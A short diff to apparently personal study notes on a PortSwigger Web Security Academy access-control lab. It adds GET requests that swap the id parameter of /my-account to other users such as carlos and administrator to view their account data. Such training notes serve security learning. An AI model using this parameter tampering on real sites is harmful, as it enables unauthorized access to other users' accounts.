@@ -34,3 +34,13 @@ uid and id parameter converts as login another users, both id and userid is ApiK
 ```
 GET /my-account?id=80bd0023-fd27-4afd-b42a-161256c48970
 ```
+url: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
+Redirect user like carlos, administrator, wiener
+```
+GET /my-account?id=
+GET /my-account?id=carlos
+GET /my-account?id=wiener
+GET /my-account?id=administrator
+```
+
+
